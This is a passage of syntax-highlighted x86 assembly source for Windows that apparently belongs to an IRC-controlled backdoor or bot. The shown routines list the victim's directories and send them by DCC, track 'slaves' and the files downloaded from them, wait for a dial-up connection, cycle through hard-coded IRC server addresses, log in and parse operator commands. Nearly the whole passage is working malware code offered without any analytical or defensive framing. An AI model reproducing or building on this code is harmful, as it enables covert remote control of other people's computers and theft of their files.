        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">EndDirFunction</span><span class="sc0">

    </span><span class="sc5">SendFileName</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.cFileName</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.dwFileAttributes</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SendFilename</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">
   </span><span class="sc5">SendFilename</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">CRLF</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">FindNextFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">SendFileName</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">

   </span><span class="sc5">EndDirFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RecvString</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DirFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DCCSendFunction</span><span class="sc0">

   </span><span class="sc5">ErrorDirFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DirFunction</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">







   </span><span class="sc5">AddNewSlave</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateString</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NickStr</span><span class="sc0">    </span><span class="sc1">; copy name to slaveX</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LoadSlaveData</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Slave1</span><span class="sc0">           </span><span class="sc1">; Reload slavedata      </span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PRIVMSGNick</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DCCSendSpaceSaver</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">YouGotFileStr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DCCSendSpaceSaver</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DownloadedFiles</span><span class="sc0">

     </span><span class="sc5">SendFileList</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">SendFileList</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IsOnline</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">RASCONN</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                        </span><span class="sc1">; edx = BufferSize = 1000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                        </span><span class="sc1">; ecx -&gt; Number of conns</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.dwSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">sizeof</span><span class="sc4">(</span><span class="sc5">RASCONN</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RasEnumConnections</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.hrasconn</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LocalFree</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; eax = 1000</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; eax = Number of conns</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WaitUntilOnline</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">ConnStatus</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">RASCONNSTATUSA</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">:</span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">RASCONNSTATUSA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ConnStatus</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WaitUntilOnlineStart</span><span class="sc0">


</span><span class="sc5">PauseAndThenCheckOnlineAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">


</span><span class="sc5">WaitUntilOnlineStart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IsOnline</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">PauseAndThenCheckOnlineAgain</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.dwSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">sizeof</span><span class="sc4">(</span><span class="sc5">RASCONNSTATUSA</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RasGetConnectStatus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.rasconnstate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RASCS_Connected</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">PauseAndThenCheckOnlineAgain</span><span class="sc0">

        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">WaitUntilOnline</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">ConnectToServer</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">SockAddrTemp</span><span class="sc4">:</span><span class="sc5">sockaddr_in</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">closesocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SocketPtr</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">socket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SOCK_STREAM</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">SocketPtr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">ConnectToServerLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WaitUntilOnline</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IRCCurrentIp</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">PointToNextIp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IRCIpNumbers</span><span class="sc0">

   </span><span class="sc5">PointToNextIp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">IRCCurrentIp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">inet_addr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">sin_addr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; move to connect data</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sin_family</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">connect</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SocketPtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">sizeof</span><span class="sc4">(</span><span class="sc5">sockaddr_in</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; connect</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ConnectToServerLoop</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIpFunction</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SendMyNickInfo</span><span class="sc0">              </span><span class="sc1">; send login data</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SendMyUserInfo</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">NotOnline</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ConnectToServer</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SplitMessage</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Message</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]==</span><span class="sc12">':'</span><span class="sc0">                 </span><span class="sc1">; Message Handler</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitStringAtSpace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Buffs</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; command</span><span class="sc0">

                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExclamanationMark</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">DontEndNick</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc5">DontEndNick</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">SendingNick</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IgnoreNicks</span><span class="sc0">

             </span><span class="sc5">IsOnIgnoreList</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StringCmp</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ParseMessage</span><span class="sc0">            </span><span class="sc1">; Dont parse if ignore</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IsOnIgnoreList</span><span class="sc0">

        </span><span class="sc9">.else</span><span class="sc0">                                   </span><span class="sc1">; System Handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Buffs</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">.endif</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SplitMessage</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                


</span><span class="sc5">ParseCommand</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">ParseData</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">WhereInParseData</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">WhatToParse</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">Inverse</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">ParseData</span><span class="sc0">

     </span><span class="sc5">ParseLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Inverse</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">   

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ParseCommandReturn</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DoCommand</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'!'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CreateStringToLookIn</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Inverse</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">CreateStringToLookIn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">


        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; save esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitStringAtSpace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; edi -&gt; what to look in</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; esi -&gt; what to look for</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; save for LocalFree</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1100</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; created string 1</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateString</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; create string 2</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateString</span><span class="sc0">                    

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">setc</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LocalFree</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Inverse</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">DontDoCommand</span><span class="sc0">

    </span><span class="sc5">DoCommand</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">


        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'|'</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">


